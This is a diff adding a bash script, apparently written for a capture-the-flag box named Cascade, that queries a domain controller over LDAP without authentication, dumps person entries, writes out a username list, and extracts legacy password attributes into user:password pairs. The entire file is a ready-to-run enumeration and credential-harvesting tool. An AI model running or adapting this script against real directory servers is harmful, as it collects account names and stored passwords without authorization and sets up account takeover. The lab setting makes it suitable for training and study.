@@ -1,0 +1,52 @@
+#!/usr/bin/env bash
+# Author: strikoder
+# File: ldap_noauth_enum.sh
+# Usage: ./ldap_noauth_enum.sh -t <IP> -d <domain> [-ldaps]
+
+set -euo pipefail
+
+IP=""; DOMAIN=""; USE_LDAPS=0
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    -t) IP="$2"; shift 2 ;;
+    -d) DOMAIN="$2"; shift 2 ;;
+    -ldaps) USE_LDAPS=1; shift ;;
+    *) echo "Usage: $0 -t <IP> -d <domain> [-ldaps]"; exit 1 ;;
+  esac
+done
+[[ -z "$IP" || -z "$DOMAIN" ]] && { echo "Missing -t/-d"; exit 1; }
+
+# Build base DN from domain (e.g., cascade.local -> dc=cascade,dc=local)
+BASE_DN="$(awk -F. '{for(i=1;i<=NF;i++){printf "dc=%s%s",$i,(i<NF?",":"")}}' <<<"$DOMAIN")"
+PROTO=$([[ $USE_LDAPS -eq 1 ]] && echo "ldaps" || echo "ldap")
+
+echo "[*] Using $PROTO. If you want LDAPS, add -ldaps."
+echo "[*] DC: $IP  |  Domain: $DOMAIN  |  BaseDN: $BASE_DN"
+
+OUTDIR="results_ldap_noauth"
+mkdir -p "$OUTDIR"
+
+# 1) LDAP dump (no auth)
+echo "[*] Running ldapsearch (objectClass=person)…"
+ldapsearch -LLL -x -H "$PROTO://$IP" -b "$BASE_DN" "(objectClass=person)" \
+  | tee "$OUTDIR/ldapresults.txt"
+
+# 2) Extract usernames -> usernames.txt
+echo "[*] Extracting sAMAccountName to $OUTDIR/usernames.txt"
+grep -i "^sAMAccountName:" "$OUTDIR/ldapresults.txt" | cut -d ":" -f2 | cut -d " " -f2 \
+  | sort -u > "$OUTDIR/usernames.txt"
+
+# 3) Find entries having cascadeLegacy* and save "user:password" -> cascade_creds.txt
+#    Keeps association per LDAP entry (blocks separated by blank lines)
+echo "[*] Extracting cascadeLegacy creds to $OUTDIR/cascade_creds.txt"
+awk 'BEGIN{IGNORECASE=1}
+     /^$/ { if(u!="" && p!=""){print u ":" p}; u=""; p=""; next }
+     /^sAMAccountName:[[:space:]]*/ { sub(/^sAMAccountName:[[:space:]]*/,""); u=$0 }
+     /cascadeLegacy/ && /:/ { sub(/^[^:]*:[[:space:]]*/,""); p=$0 }
+     END { if(u!="" && p!=""){print u ":" p} }' "$OUTDIR/ldapresults.txt" \
+  > "$OUTDIR/cascade_creds.txt"
+
+echo "[*] Done. Outputs:"
+echo "    - $OUTDIR/ldapresults.txt"
+echo "    - $OUTDIR/usernames.txt"
+echo "    - $OUTDIR/cascade_creds.txt"
